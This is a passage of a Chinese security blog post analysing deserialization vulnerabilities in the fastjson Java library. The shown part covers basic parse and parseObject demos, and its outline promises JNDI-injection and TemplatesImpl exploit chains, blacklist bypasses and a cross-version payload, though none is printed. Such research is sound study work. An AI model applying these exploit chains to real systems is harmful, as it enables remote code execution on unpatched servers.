<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="推荐阅读时间：60min全文字数：14026 前言其实从一开始就是想着学一下fastjson组件的反序列化。结果发现完全理解不能。 就先一路补了很多其他知识点，RMI反序列化，JNDI注入，7u21链等（就是之前的文章），之后也是拖了很长时间，花了很长时间，总算把这篇一开始就想写的文，给补完了。 类似的文是已经有了不少，学习也是基于前辈们的文章一步步走来，但是个人习惯于把所有问题理清楚，讲清楚。理">
<meta name="keywords" content="java">
<meta property="og:type" content="article">
<meta property="og:title" content="java反序列化-fastjson">
<meta property="og:url" content="http://lalajun.com/2019/12/30/java反序列化-fastjson/index.html">
<meta property="og:site_name" content="啦啦菌NODE">
<meta property="og:description" content="推荐阅读时间：60min全文字数：14026 前言其实从一开始就是想着学一下fastjson组件的反序列化。结果发现完全理解不能。 就先一路补了很多其他知识点，RMI反序列化，JNDI注入，7u21链等（就是之前的文章），之后也是拖了很长时间，花了很长时间，总算把这篇一开始就想写的文，给补完了。 类似的文是已经有了不少，学习也是基于前辈们的文章一步步走来，但是个人习惯于把所有问题理清楚，讲清楚。理">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae284qq65j31tz122wl9.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27y570pj31va0ylted.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27qrizoj30qk07yglz.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27is4imj31xh0rg7an.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27eideej31sm0pw156.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26zr372j31w30ggtba.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26zr372j31w30ggtba.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26u6n7bj31ha0oxdia.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26iha62j322q127wut.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae265y6ofj30ze0t676p.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25r6kaij31zm0wotma.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25jl1alj322s0xzh02.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae255pusej321d145qc2.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25093pcj31kb17qwk6.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae24s31kmj31hn199n2h.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae246qlpuj314y0zpgpt.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23y11clj31z60yftlz.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23khmmfj328l12jguc.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23atakrj31yj0wl49q.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22z6chbj32bc0qx41t.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22owggwj30q80s1jt6.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22edebfj326g15vtmt.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae228422cj323s12utl9.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22090njj31yh16gn9j.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae21szagqj32bc0y5430.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae21hu6b9j30gf0cxq3f.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20ylpp2j31qk0m27b7.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae216919uj31rr0u5wo1.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20r1rm1j31jx12n79e.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20kc2g7j31qu1010yj.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae208j8n5j315c0ks0vj.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae200kj2oj31es06o0tv.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1zt2oc7j31hl09egn5.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1zmg3hyj31ny09pq4l.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1ze46z5j31mu0clwgz.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yzmow5j315a0d875h.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yrwgg9j31du0gnabi.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1ylwm5kj31ms163q9k.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yfjv3dj31px0c60ud.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1y8ah44j315c12vn1i.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1y0ztirj30w706uwew.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1xtd6q3j30z404qjri.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1xjwj9qj312r03tgls.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1x8rjbbj31ce0zh77r.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1wztxobj31gy12lq8g.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1wnadlyj30pi0brta3.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1w1dpcnj31om1057e4.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1vmjmw2j32bc0lhacn.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1v926igj31ok0b20ub.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1utn1i5j327q0n2mzu.jpg">
<meta property="og:updated_time" content="2019-12-30T03:02:06.764Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="java反序列化-fastjson">
<meta name="twitter:description" content="推荐阅读时间：60min全文字数：14026 前言其实从一开始就是想着学一下fastjson组件的反序列化。结果发现完全理解不能。 就先一路补了很多其他知识点，RMI反序列化，JNDI注入，7u21链等（就是之前的文章），之后也是拖了很长时间，花了很长时间，总算把这篇一开始就想写的文，给补完了。 类似的文是已经有了不少，学习也是基于前辈们的文章一步步走来，但是个人习惯于把所有问题理清楚，讲清楚。理">
<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gae284qq65j31tz122wl9.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>java反序列化-fastjson</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/02/14/智能合约蜜罐-区块链浏览器/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/12/03/WEB-XXE/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2019/12/30/java反序列化-fastjson/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&text=java反序列化-fastjson"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&title=java反序列化-fastjson"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&is_video=false&description=java反序列化-fastjson"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=java反序列化-fastjson&body=Check out this article: http://lalajun.com/2019/12/30/java反序列化-fastjson/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&title=java反序列化-fastjson"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&title=java反序列化-fastjson"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&title=java反序列化-fastjson"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&title=java反序列化-fastjson"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&name=java反序列化-fastjson&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson组件"><span class="toc-number">2.</span> <span class="toc-text">fastjson组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson组件使用"><span class="toc-number">2.1.</span> <span class="toc-text">fastjson组件使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#type"><span class="toc-number">2.2.</span> <span class="toc-text">@type</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【-lt-1-2-24】JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl"><span class="toc-number">3.</span> <span class="toc-text">【&lt;=1.2.24】JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件"><span class="toc-number">3.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用链"><span class="toc-number">3.2.</span> <span class="toc-text">利用链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【-lt-1-2-24】JDK1-7-的TemplatesImpl利用链"><span class="toc-number">4.</span> <span class="toc-text">【&lt;=1.2.24】JDK1.7 的TemplatesImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件-1"><span class="toc-number">4.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tfactory为空的说明"><span class="toc-number">4.2.</span> <span class="toc-text">_tfactory为空的说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bytecodes需要base64编码"><span class="toc-number">4.3.</span> <span class="toc-text">_bytecodes需要base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getOutputProperties字段-gt-getOutputProperties方法"><span class="toc-number">4.4.</span> <span class="toc-text">_getOutputProperties字段 =&gt; getOutputProperties方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson抗争的一生"><span class="toc-number">5.</span> <span class="toc-text">Fastjson抗争的一生</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-24漏洞版本修复"><span class="toc-number">5.1.</span> <span class="toc-text">1.2.24漏洞版本修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25-1-2-41绕过"><span class="toc-number">5.2.</span> <span class="toc-text">1.2.25-1.2.41绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42版本修复"><span class="toc-number">5.3.</span> <span class="toc-text">1.2.42版本修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42绕过"><span class="toc-number">5.4.</span> <span class="toc-text">1.2.42绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-43版本修复"><span class="toc-number">5.5.</span> <span class="toc-text">1.2.43版本修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-44-限制"><span class="toc-number">5.6.</span> <span class="toc-text">1.2.44 [ 限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-45-黑名单添加"><span class="toc-number">5.7.</span> <span class="toc-text">1.2.45 黑名单添加</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-47-通杀payload！"><span class="toc-number">5.8.</span> <span class="toc-text">1.2.47 通杀payload！</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#deserializers-findClass-typeName"><span class="toc-number">5.8.1.</span> <span class="toc-text">deserializers.findClass(typeName)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TypeUtils-getClassFromMapping-typeName"><span class="toc-number">5.8.2.</span> <span class="toc-text">TypeUtils.getClassFromMapping(typeName)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#定向砸payload"><span class="toc-number">5.8.3.</span> <span class="toc-text">定向砸payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-48修复"><span class="toc-number">5.9.</span> <span class="toc-text">1.2.48修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-48以后"><span class="toc-number">5.10.</span> <span class="toc-text">1.2.48以后</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        java反序列化-fastjson
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">啦啦菌NODE</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-12-30T01:05:28.000Z" itemprop="datePublished">2019-12-30</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/java/">java</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>推荐阅读时间：60min<br>全文字数：14026</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实从一开始就是想着学一下fastjson组件的反序列化。结果发现完全理解不能。</p>
<p>就先一路补了很多其他知识点，RMI反序列化，JNDI注入，7u21链等（就是之前的文章），之后也是拖了很长时间，花了很长时间，总算把这篇一开始就想写的文，给补完了。</p>
<p>类似的文是已经有了不少，学习也是基于前辈们的文章一步步走来，但是个人习惯于把所有问题理清楚，讲清楚。理应是把大佬们的文要细致些。</p>
<p>本文需要前置知识：JNDI注入，7u21利用链，可以戳我往期的文章。</p>
<p>文章内容如下：</p>
<ol>
<li>fastjson组件基础介绍及使用（三种反序列化形式等）</li>
<li>fastjson组件的<strong>@type标识</strong>的特性说明（默认调用setter、getter方法条件等）。</li>
<li>分析了fastjson组件<strong>1.2.24版本</strong>中JNDI注入利用链与setter参数巧妙完美适配（前置知识参考JNDI注入一文）</li>
<li>分析了fastjson组件<strong>1.2.24版本</strong>中JDK1.7TemplatesImpl利用链的漏洞触发点poc构造（前置知识参考7u21一文）</li>
<li>分析了1.2.24-1.2.46版本每个版本迭代中修改代码，修复思路和绕过。（此时由于默认白名单的引入，漏洞危害大降）</li>
<li>到了1.2.47通杀黑白名单漏洞，因为网上对于这个分析文有点过多。这边想着直接正向来没得意思。尝试从代码审计漏洞挖掘的角度去从零开始挖掘出这一条利用链。最后发现产生了一种我上我也行的错觉（当然实际上只是一种错觉，不可避免受到了已有payload的引导，但是经过分析也算是不会对大佬的0day产生一种畏惧心理，看完也是可以理解的）最后再看了下修复。</li>
</ol>
<p>本文实验代码均上传<a href="https://github.com/lalajun/Fastjson_Deserialize" target="_blank" rel="noopener">github</a>，那么想要好好学习的小伙伴请打开idea，配合食用。</p>
<h2 id="fastjson组件"><a href="#fastjson组件" class="headerlink" title="fastjson组件"></a>fastjson组件</h2><p>fastjson组件是阿里巴巴开发的反序列化与序列化组件，具体细节可以参考<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN" target="_blank" rel="noopener">github文档</a></p>
<p>组件api使用方法也很简洁<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">String text = JSON.toJSONString(obj); </span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">VO vo = JSON.parse(); <span class="comment">//解析为JSONObject类型或者JSONArray类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>); <span class="comment">//JSON文本解析成JSONObject类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>, VO.class); <span class="comment">//JSON文本解析成VO.class类</span></span><br></pre></td></tr></table></figure></p>
<p>我们通过demo来使用一下这个组件</p>
<p>以下使用测试均是基于1.2.24版本的fastjson jar包</p>
<p>靶机搭建需要存在漏洞的jar包，但是在github上通常会下架存在漏洞的jar包。</p>
<p>我们可以从<a href="https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24" target="_blank" rel="noopener">maven仓库</a>中找到所有版本jar包,方便漏洞复现。</p>
<h3 id="fastjson组件使用"><a href="#fastjson组件使用" class="headerlink" title="fastjson组件使用"></a>fastjson组件使用</h3><p>先构建需要序列化的User类：<br><code>User.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>再使用fastjson组件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建一个用于实验的user类</span></span><br><span class="line">        User user1 = <span class="keyword">new</span> User();</span><br><span class="line">        user1.setName(<span class="string">"lala"</span>);</span><br><span class="line">        user1.setAge(<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        String serializedStr = JSON.toJSONString(user1);</span><br><span class="line">        System.out.println(<span class="string">"serializedStr="</span>+serializedStr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parse方法进行反序列化，返回的是一个JSONObject</span></span><br><span class="line">        Object obj1 = JSON.parse(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化对象名称:"</span>+obj1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化："</span>+obj1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line">        Object obj2 = JSON.parseObject(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,指定类后返回的是一个相应的类对象</span></span><br><span class="line">        Object obj3 = JSON.parseObject(serializedStr,User.class);</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj3.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>以上使用了三种形式反序列化<br>结果如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">serializedStr=&#123;<span class="string">"age"</span>:<span class="number">11</span>,<span class="string">"name"</span>:<span class="string">"lala"</span>&#125;</span><br><span class="line"><span class="comment">//parse(&#123;..&#125;)反序列化</span></span><br><span class="line">parse反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parse反序列化：&#123;<span class="string">"name"</span>:<span class="string">"lala"</span>,<span class="string">"age"</span>:<span class="number">11</span>&#125;</span><br><span class="line"><span class="comment">//parseObject(&#123;..&#125;)反序列化</span></span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;<span class="string">"name"</span>:<span class="string">"lala"</span>,<span class="string">"age"</span>:<span class="number">11</span>&#125;</span><br><span class="line"><span class="comment">//parseObject(&#123;&#125;,class)反序列化</span></span><br><span class="line">parseObject反序列化对象名称:com.fastjson.User</span><br><span class="line">parseObject反序列化:com.fastjson.User@<span class="number">3</span>d71d552</span><br></pre></td></tr></table></figure></p>
<p>parseObject({..})其实就是parse({..})的一个封装，对于parse的结果进行一次结果判定然后转化为JSONOBject类型。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    Object obj = parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>而parseObject({},class)好像会调用class加载器进行类型转化，但这个细节不是关键，就不研究了</p>
<p>那么三种反序列化方式除了返回结果之外，还有啥区别？</p>
<p>在执行过程调用函数上有不同。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastJsonTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FastJsonTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String test)</span> 